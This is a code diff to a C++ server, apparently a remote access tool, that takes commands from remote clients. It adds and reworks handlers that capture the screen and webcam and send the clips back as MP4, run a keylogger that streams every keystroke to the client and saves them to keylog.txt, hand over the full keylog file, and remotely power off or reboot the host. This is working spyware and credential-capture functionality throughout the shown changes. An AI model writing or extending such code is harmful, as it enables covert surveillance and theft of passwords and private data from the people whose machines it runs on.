@@ -4,6 +4,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <netinet/in.h>
+#include <unistd.h> // for gethostname
 #include <netinet/tcp.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -324,7 +325,17 @@ void BackendServer::handleClient(int fd) {
                 std::lock_guard<std::mutex> lk(rec_mu);
                 if (screen_rec_file.is_open()) screen_rec_file.close();
             }
-            send_file("screen.h264", "screen_clip.h264", cid, bid);
+
+            // Convert to MP4
+            std::cout << "[Server] Converting screen.h264 to mp4..." << std::endl;
+            int ret = system("ffmpeg -y -r 30 -i screen.h264 -c:v copy screen.mp4 > /dev/null 2>&1");
+
+            if (ret == 0) {
+                 send_file("screen.mp4", "screen_clip.mp4", cid, bid);
+            } else {
+                 std::cerr << "[Server] FFmpeg conversion failed." << std::endl;
+                 send_text("ERROR: Recording conversion failed", cid, bid);
+            }
         }).detach();
     };
 
@@ -344,7 +355,17 @@ void BackendServer::handleClient(int fd) {
                 std::lock_guard<std::mutex> lk(rec_mu);
                 if (webcam_rec_file.is_open()) webcam_rec_file.close();
             }
-            send_file("webcam.h264", "webcam_clip.h264", cid, bid);
+
+            // Convert to MP4
+            std::cout << "[Server] Converting webcam.h264 to mp4..." << std::endl;
+            int ret = system("ffmpeg -y -r 30 -i webcam.h264 -c:v copy webcam.mp4 > /dev/null 2>&1");
+
+            if (ret == 0) {
+                send_file("webcam.mp4", "webcam_clip.mp4", cid, bid);
+            } else {
+                std::cerr << "[Server] FFmpeg conversion failed." << std::endl;
+                send_text("ERROR: Recording conversion failed", cid, bid);
+            }
         }).detach();
     };
 
@@ -476,8 +497,35 @@ void BackendServer::handleClient(int fd) {
         }
     };
 
-    handlers["ping"] = [&](const auto&, uint32_t cid, uint32_t bid) { send_text("PONG", cid, bid); };
-    handlers["shutdown"] = [&](const auto&, uint32_t cid, uint32_t bid) { send_text("OK: Shutdown requested", cid, bid); };
+    handlers["ping"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        char hostname[1024];
+        if (gethostname(hostname, sizeof(hostname)) == 0) {
+             send_text("INFO: NAME=" + std::string(hostname), cid, bid);
+        } else {
+             send_text("INFO: NAME=Unknown-Host", cid, bid);
+        }
+    };
+    handlers["shutdown"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        send_text("OK: Shutting down server...", cid, bid);
+        std::thread([&]() {
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+            std::cout << "[Server] Executing poweroff..." << std::endl;
+            if (system("poweroff") != 0) {
+                std::cerr << "[Server] ERROR: Failed to execute poweroff (sudo required?)" << std::endl;
+            }
+        }).detach();
+    };
+
+    handlers["restart"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        send_text("OK: Restarting server...", cid, bid);
+        std::thread([&]() {
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+            std::cout << "[Server] Executing reboot..." << std::endl;
+            if (system("reboot") != 0) {
+                std::cerr << "[Server] ERROR: Failed to execute reboot (sudo required?)" << std::endl;
+            }
+        }).detach();
+    };
 
     handlers["kill_process"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
         if (a.size() < 2) return (void)send_text("ERROR: Missing PID", cid, bid);
@@ -502,13 +550,26 @@ void BackendServer::handleClient(int fd) {
     std::atomic<bool> keylog_active(false);
 
     handlers["start_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        std::cout << "[Server] Received start_keylog command from Client " << cid << std::endl; // TRACER LOG
+        std::cout << "[Server] Received start_keylog command from Client " << cid << std::endl;
 
         if (keylog_active.load()) return (void)send_text("ERROR: Keylogger already running", cid, bid);
 
         if (!keylogger) keylogger = std::make_unique<Keylogger>();
 
-        if (!keylogger->start()) {
+        // Start with callback that sends text immediately AND writes to file
+        bool started = keylogger->start([&, cid, bid](std::string key) {
+             send_text("KEYLOG: " + key, cid, bid);
+
+             // Append to keylog.txt
+             std::ofstream logfile("keylog.txt", std::ios::app);
+             if (logfile.is_open()) {
+                 logfile << key;
+                 // Flush sometimes? std::endl flushes but we append string.
+                 // For now relying on close or auto flush.
+             }
+        });
+
+        if (!started) {
             std::cerr << "[Server] Failed to start keylogger: " << keylogger->get_last_error() << std::endl;
             send_text("ERROR: Failed to start keylogger: " + keylogger->get_last_error(), cid, bid);
             return;
@@ -516,26 +577,17 @@ void BackendServer::handleClient(int fd) {
 
         keylog_active.store(true);
         send_text("OK: Keylogger started", cid, bid);
-
-        keylog_thread = std::thread([&, cid, bid]() {
-            keylogger->run_capture([&](std::string key) {
-                if (!alive.load() || !keylog_active.load()) return;
-                // Batching could be better, but character-by-character for now
-                // Prefix with specific tag for frontend parsing
-                send_text("KEYLOG: " + key, cid, bid);
-            });
-            keylog_active.store(false);
-            send_text("INFO: Keylogger stopped", cid, bid);
-        });
-        keylog_thread.detach();
     };
 
     handlers["stop_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
         if (!keylog_active.load()) return (void)send_text("ERROR: Keylogger not running", cid, bid);
         if (keylogger) keylogger->stop();
         keylog_active.store(false);
-        // Thread will exit when read() returns or run_capture checks running_
-        send_text("OK: Keylogger stop requested", cid, bid);
+        send_text("OK: Keylogger stopped", cid, bid);
+    };
+
+    handlers["get_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        send_file("keylog.txt", "full_keylog.txt", cid, bid);
     };
 
     while (running_.load()) {
